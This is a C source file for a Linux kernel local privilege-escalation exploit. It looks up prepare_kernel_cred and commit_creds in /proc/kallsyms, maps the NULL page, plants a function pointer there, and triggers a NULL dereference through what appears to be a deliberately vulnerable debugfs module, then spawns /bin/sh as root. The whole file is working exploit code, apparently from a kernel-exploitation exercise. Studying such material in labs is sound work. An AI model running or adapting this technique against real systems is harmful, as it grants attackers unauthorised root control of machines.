#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/utsname.h>

struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)
  __attribute__((regparm(3)));
typedef int (*commit_creds_t)(struct cred *new)
  __attribute__((regparm(3)));

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

void *get_ksym(char *name)
{
	FILE *f = fopen("/proc/kallsyms", "rb");
	char c, sym[512];
	void *addr;
	int ret;
	while (fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0)
		if (!strcmp(sym, name))
			return addr;
	return 0;
}

void get_root(void) {
        commit_creds(prepare_kernel_cred(0));
}

int main()
{
	// Print some system infos
	struct utsname name;
	uname(&name);
	printf("sysname: %s; nodename: %s; release: %s; version: %s; machine: %s\n", name.sysname,
	                                                                             name.nodename,
	                                                                             name.release,
	                                                                             name.version,
	                                                                             name.machine);

	// Start the party
	prepare_kernel_cred = get_ksym("prepare_kernel_cred");
	commit_creds        = get_ksym("commit_creds");

	if (!(prepare_kernel_cred && commit_creds)) {
		fprintf(stderr, "Kernel symbols not found. "
		                "Is your kernel older than 2.6.29?\n");
		exit(1);
	}

	printf("prepare_kernel_cred: %p\n", prepare_kernel_cred);
	printf("commit creds: %p\n", commit_creds);

	// Put a pointer to our function at NULL
	mmap(0, 4096, PROT_READ | PROT_WRITE,
	     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	void (**fn)(void) = NULL;
	*fn = get_root;

	// Trigger the kernel
	int fd = open("/sys/kernel/debug/nullderef/null_call", O_WRONLY);
	write(fd, "1", 1);
	close(fd);

	if (getuid() == 0) {
		printf("launching root shell...\n");
	        char *argv[] = {"/bin/sh", NULL};
	        execve("/bin/sh", argv, NULL);
	}

	printf("could not acquire root... sorry\n");
	return 1;
}
